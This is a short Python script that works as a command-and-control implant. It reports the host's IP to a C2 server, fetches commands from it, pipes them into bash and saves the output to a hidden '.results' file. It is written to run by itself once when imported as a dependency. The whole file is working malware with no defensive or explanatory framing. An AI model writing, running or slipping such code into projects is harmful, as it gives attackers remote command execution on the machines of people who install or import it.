"""
Hit dat C2, get dem commands
"""
def main():
    import socket
    import sys
    from subprocess import *

    server = "127.0.0.1:5000"    # C2 IP:port

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close
    cb_url = "http://" + server + "/" + ip + "/enderman"
    try:
        import urllib.request as urllib
    except:
        import urllib
    code = urllib.urlopen(cb_url).readlines()
    out = open(".results","w")
    p = Popen("bash", stdin=PIPE, stdout=out, stderr=out)
    for line in code:
        p.stdin.write(line)
    p.communicate()
    out.close()

import __main__
try:
    _ = __main__.isDep
except:
    __main__.isDep = True
    main()
